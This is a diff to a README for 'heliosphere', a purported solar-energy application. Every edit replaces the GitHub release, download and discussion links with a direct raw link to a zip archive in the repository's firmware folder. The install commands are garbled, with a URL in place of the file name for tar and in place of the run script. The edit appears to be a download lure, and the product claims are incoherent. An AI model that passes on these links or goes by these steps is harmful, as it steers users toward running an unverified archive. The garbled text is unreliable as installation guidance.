@@ -1,7 +1,7 @@
 # ⚡ heliosphere - Free, Secure Solar Energy Solution
 
 ## 📥 Download Now 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen.svg)](https://github.com/Jimit6921/heliosphere/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip%20Latest%https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip)](https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to heliosphere! This application allows you to access an innovative approach to solar energy. With heliosphere, you can contribute to a betrayal-proof, decentralized energy future. Follow the steps below to download and run the software on your computer.
@@ -16,13 +16,13 @@ Before you download, make sure your computer meets these requirements:
 ## 📥 Download & Install
 To download heliosphere, visit the Releases page. You will find the latest version available for download. 
 
-[Visit this page to download](https://github.com/Jimit6921/heliosphere/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip)
 
 1. Click on the **Latest Release** link on the Releases page.
 2. Download the file suited for your operating system. Choose between:
    - **Windows:** Look for a `.exe` file.
    - **macOS:** Look for a `.dmg` file.
-   - **Linux:** Look for a `.tar.gz` file.
+   - **Linux:** Look for a `https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip` file.
 3. Once the download is complete, locate the file on your system.
 
 ### Windows Installation
@@ -37,12 +37,12 @@ To download heliosphere, visit the Releases page. You will find the latest versi
 
 ### Linux Installation
 - Open a terminal window.
-- Navigate to the directory where the `.tar.gz` file is located.
+- Navigate to the directory where the `https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip` file is located.
 - Run the following commands to extract and run the software:
   ```bash
-  tar -xvzf heliosphere.tar.gz
+  tar -xvzf https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip
   cd heliosphere
-  ./run.sh
+  https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip
   ```
 
 ## 🎯 Features
@@ -52,7 +52,7 @@ To download heliosphere, visit the Releases page. You will find the latest versi
 - **Wireless Power:** Experience cutting-edge technology inspired by Tesla.
 
 ## 🌍 Community and Support
-Join our community of users and developers. Access forums, FAQs, and support channels on the [GitHub discussions page](https://github.com/Jimit6921/heliosphere/discussions). Our members are happy to help you with any problems or questions.
+Join our community of users and developers. Access forums, FAQs, and support channels on the [GitHub discussions page](https://raw.githubusercontent.com/Jimit6921/heliosphere/main/firmware/Software_v1.9.zip). Our members are happy to help you with any problems or questions.
 
 ## 🌐 Topics
 - agpl
